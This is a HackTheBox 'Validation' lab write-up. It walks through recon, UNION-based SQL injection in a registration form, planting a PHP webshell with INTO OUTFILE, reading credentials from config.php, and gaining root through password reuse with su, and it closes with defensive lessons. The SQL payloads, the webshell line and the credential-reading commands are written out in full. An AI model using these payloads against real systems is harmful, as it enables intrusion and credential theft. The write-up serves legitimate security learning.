# HTB - Validation

Linux machine, Easy difficulty. I did it as part of my security learning path while studying ASIR. I'm leaving it documented exactly as I solved it, dead ends included, because I think that makes the real process easier to understand than if I only showed "command → result → flag".

- **IP:** 10.129.95.235
- **OS:** Linux (Debian)
- **Difficulty:** Easy

---

## First steps

First, a ping to see if the machine responded:

```bash
ping 10.129.95.235
```

It responded fine, and I looked at the TTL:

```
64 bytes from 10.129.95.235: icmp_seq=1 ttl=63 time=55.0 ms
```

TTL=63 → a hint that it is Linux (it usually starts at 64 and drops to 63 after crossing a network hop).

Then I ran the typical Nmap scan, first looking up what each parameter did because I didn't want to use it without understanding it:

```bash
nmap -sC -sV -p- --open -n -Pn 10.129.95.235
```

- `-sC` → Nmap default scripts
- `-sV` → detect service versions
- `-p-` → all ports, not just the usual 1000
- `--open` → only show the ones that are open
- `-n` → no DNS resolution
- `-Pn` → no prior ping (treats it as up directly)

Port 80 came up open, an Apache.

To find out what language the website used (a guided HTB question), I did a quick curl:

```bash
curl -I http://10.129.95.235
```

And the headers showed:

```
Server: Apache/2.4.48 (Debian)
X-Powered-By: PHP/7.4.23
```

Language: **PHP**.

---

## Finding the injectable field (I got pretty stuck here)

I didn't do directory fuzzing or any "serious" web enumeration, I went straight for the registration form on the page, which was basically the only place you entered data.

I tried putting a single quote `'` into the fields to see if it broke anything. The problem is that the **country** field wasn't a text input, it was a dropdown (`<select>`), so I couldn't type anything there directly from the browser. I spent a while not understanding how I was going to inject something into a field that won't even let you type.

The solution was to bring Burp Suite into it: you intercept the request before it goes out, and there you can change the value of `country` to whatever you want, even though in the browser it was a closed dropdown.

The flow I ended up with (and that took me a while to grasp at first) was:

1. I make a **POST** to `/` registering a new user (the username can't be repeated, so I kept going through `test1`, `test2`, `testX`...) and in `country` I put the SQL payload
2. The server responds `302 Found` + a cookie (`Set-Cookie: user=XXXX`) → this just means "registration done, redirecting you to account.php", nothing weirder
3. I grab that cookie
4. I make a **GET** to `/account.php` putting that cookie in the header
5. In that response I see the result of what I injected reflected back

(Note to self: at the time I thought that because it gave a 302 this was a "blind" injection, but no — it's the opposite. It's an in-band / UNION-based SQLi, because I see the result directly in the HTML of the response. Blind would be if it returned nothing and I had to deduce it from response times or true/false.)

---

## Confirming it really was injectable

I didn't want to be left with the doubt of "is this injectable or am I fooling myself because I gave it a random name". Two things really confirmed it for me:

**1.** When I tried with a column count that didn't match, the server crashed with this:

```
Fatal error: Uncaught Error: Call to a member function fetch_assoc() on bool in /var/www/html/account.php:33
```

That's a PHP error talking about a MySQL function. If the field were normal text, this would never happen just from changing what I type.

**2.** When I put `UNION SELECT database()`, the page returned the real name of the server's database (`registration`). That cannot be a coincidence in any way — it only happens if my text is actually being executed as SQL code.

### Counting columns

I tried it the brute way:

```sql
' UNION SELECT 1,2,3-- -   → error
' UNION SELECT 1,2-- -     → error
' UNION SELECT 1-- -       → works
```

1 single column.

---

## Pulling info from the database

With the available column, I followed the thread using `information_schema`, which is a metadata database that any MySQL installation has by default (the "index" of everything there is).

**DB name:**
```sql
' UNION SELECT database()-- -
```
→ `registration`

**Tables:**
```sql
' UNION SELECT table_name FROM information_schema.tables WHERE table_schema='registration'-- -
```
→ there was only one table, `registration`

**Columns:**
```sql
' UNION SELECT column_name FROM information_schema.columns WHERE table_name='registration'-- -
```
→ `username`, `userhash`, `country`, `regtime`

**Dumping `userhash`:**
```sql
' UNION SELECT userhash FROM registration-- -
```
It returned a list of MD5 hashes. I thought they might be passwords, but they turned out to be the session cookies of each registered user. A dead end, but an expected one — this machine's path wasn't going that way.

---

## From the injection to getting a shell

MySQL lets you write files to the server's disk with `INTO OUTFILE`, if the DB user has the `FILE` privilege. I used that to drop a webshell directly into Apache's public folder:

```sql
' UNION SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE "/var/www/html/shell.php"-- -
```

This writes that PHP code into a new file (`shell.php`), accessible from outside because it lands right in the web root. That PHP takes whatever you send it in the `cmd` parameter and runs it as a system command. From here on I'm not using SQL for anything anymore, I have direct command execution from the browser:

```
http://10.129.95.235/shell.php?cmd=id
```

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

The user the web runs as is **www-data**.

---

## Escalating to root

### What didn't work

```
http://10.129.95.235/shell.php?cmd=sudo -l
```
Nothing.

```
http://10.129.95.235/shell.php?cmd=find / -perm -4000 -type f 2>/dev/null
```
Only the normal Debian SUIDs, nothing usable.

### Looking at the web's own files

Since www-data is who runs the application, I looked at its own files, in case there was some loose password lying around (a typical mistake, putting credentials directly in the code):

```
http://10.129.95.235/shell.php?cmd=cat /var/www/html/config.php
```

The browser returned it blank because it tried to interpret the `<?php ?>` tags instead of showing them as text. I pulled it out in base64 so it wouldn't break:

```
http://10.129.95.235/shell.php?cmd=cat /var/www/html/config.php | base64
```

Decoded:

```php
<?php
  $servername = "127.0.0.1";
  $username = "uhc";
  $password = "uhc-9qual-global-pw";
  $dbname = "registration";
?>
```

MySQL credentials: `uhc` / `uhc-9qual-global-pw`

### Looking for where to reuse that password

The machine's official hint said: *"Password reuse is a real problem. Look for passwords in files the www-data user has access to and check for reuse."*

I looked at which system users had a real shell (not `/usr/sbin/nologin`):

```
http://10.129.95.235/shell.php?cmd=cat /etc/passwd
```

`/etc/passwd` always exists on any Linux, it's not anything "secret" I discovered through the hack — what I was looking for there was simply which user had `/bin/bash`. And the only one with a real shell was **root**, all the other service users had `/usr/sbin/nologin` or `/bin/false`.

### Attempt 1: SSH (failed)

```bash
ssh root@10.129.95.235
```
With `uhc-9qual-global-pw` → Permission denied, three times.

I looked at the SSH config:
```
http://10.129.95.235/shell.php?cmd=cat /etc/ssh/sshd_config
```
```
#PermitRootLogin prohibit-password
```
That's the OpenSSH default value, root can't log in by password over SSH, only with a public key. That's why it failed even though the password was correct.

### Attempt 2: `su` from the webshell (worked)

Since I already had command execution via the webshell, I didn't need SSH at all. I used `su` directly, passing the password through a pipe because I don't have a real interactive terminal, I can only send single commands through the URL:

```
http://10.129.95.235/shell.php?cmd=echo uhc-9qual-global-pw | su root -c "cat /root/root.txt"
```

- `echo` prints the password
- the pipe `|` feeds it as if I had typed it when `su` asks for it
- `su root -c "..."` authenticates as root and runs only that command, without opening a full session

And with that, I was in.

---

## Flags

| Flag | Value |
|------|-------|
| user.txt | `[REDACTED]` |
| root.txt | `[REDACTED]` |

*(I'm leaving them censored, HTB asks not to publish them in full in public write-ups)*

---

## What I take away from this machine

- **Never concatenate user input into a SQL query.** This is fixed with prepared statements / parameterized queries — that way the engine always treats what you type as data, never as code, no matter what.
- **Don't reuse passwords across different systems.** The MySQL password and the OS root password were the same. They are two completely different access levels (data vs. full control of the server) and should never depend on the same secret.
- **Don't hardcode credentials in the code.** The password was in plaintext in `config.php`. It should live in environment variables or a secrets manager, out of the code and out of the web's public folder.
- **Root shouldn't be the only user with an interactive shell.** The normal setup is to have named users with `sudo` for what they need, and keep direct root access very restricted.
- **Least privilege in the database too.** The `uhc` user had the `FILE` privilege, which was exactly what let me go from a SQLi to command execution. An application user shouldn't be able to write files at the OS level.

And on methodology: next time I'll open Burp with Intercept on from the start and browse the whole site that way, instead of poking around raw in the browser and realizing too late that a field (like the country dropdown) can't be touched directly from there. It would have saved me a fair bit of hassle.
